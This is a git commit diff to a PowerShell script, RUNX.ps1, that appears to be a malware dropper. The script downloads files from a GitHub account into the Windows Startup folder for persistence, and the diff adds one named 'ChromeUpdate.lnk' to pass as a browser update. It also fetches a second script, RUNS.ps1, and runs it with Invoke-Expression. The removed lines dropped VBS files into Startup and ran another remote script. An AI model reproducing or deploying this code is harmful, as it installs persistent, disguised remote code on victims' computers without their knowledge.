877fbcedf265fe029fc7f932130d2afd21b38e56
cia168168 <147810144+cia168168@users.noreply.github.com>
2023-11-18 18:03:22 +0700

    Update RUNX.ps1

--- RUNX.ps1
+++ RUNX.ps1
@@ -1,14 +1,7 @@
-$url6 = "https://raw.githubusercontent.com/cia168168/folder/main/WINOB.vbs"
-$output6 = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WINOB.vbs"
-Invoke-WebRequest -Uri $url6 -OutFile $output6
-$url8 = "https://raw.githubusercontent.com/cia168168/folder/main/WIN32.vbs"
-$output8 = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WIN32.vbs"
+$url8 = "https://raw.githubusercontent.com/cia168168/folder/main/ChromeUpdate.lnk"
+$output8 = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\ChromeUpdate.lnk"
 Invoke-WebRequest -Uri $url8 -OutFile $output8
 $url5 = "https://raw.githubusercontent.com/cia168168/folder/main/RUNS.ps1"
 $output5 = "$env:TEMP\RUNS.ps1"
 Invoke-WebRequest -Uri $url5 -OutFile $output5
 IEX ((New-Object Net.WebClient).DownloadString($output5))
-$url7 = "https://raw.githubusercontent.com/cia168168/folder/main/RUNOB.ps1"
-$output7 = "$env:APPDATA\RUNOB.ps1"
-Invoke-WebRequest -Uri $url7 -OutFile $output7
-& $output7
